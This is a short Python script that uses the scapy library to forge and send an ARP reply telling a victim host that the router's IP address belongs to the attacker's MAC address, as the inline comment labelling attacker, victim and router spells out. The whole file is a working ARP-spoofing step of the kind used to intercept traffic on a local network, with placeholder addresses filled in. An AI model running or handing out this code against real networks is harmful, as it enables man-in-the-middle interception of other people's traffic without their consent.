import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="10.0.0.0", hwdst="00:00:00:00:00:00", psrc="10.10.0.1") #hwdst is attackers mac, pdst is victims ip and psrc is routers ip
#print(packet.show()) and print(packet.summary()) provide detail about the packet
scapy.send(packet) 

